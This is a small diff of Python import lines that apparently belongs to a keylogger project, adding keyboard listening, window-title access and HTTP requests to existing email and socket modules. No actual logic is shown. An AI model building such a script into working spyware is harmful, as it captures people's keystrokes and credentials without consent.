@@ -1,3 +1,7 @@
+from pynput.keyboard import Key,Listener
+from win32 import win32gui
+import os
+import time
 import socket
 import random
 import smtplib
@@ -6,6 +10,7 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import threading
+import requests
 import config
 
 
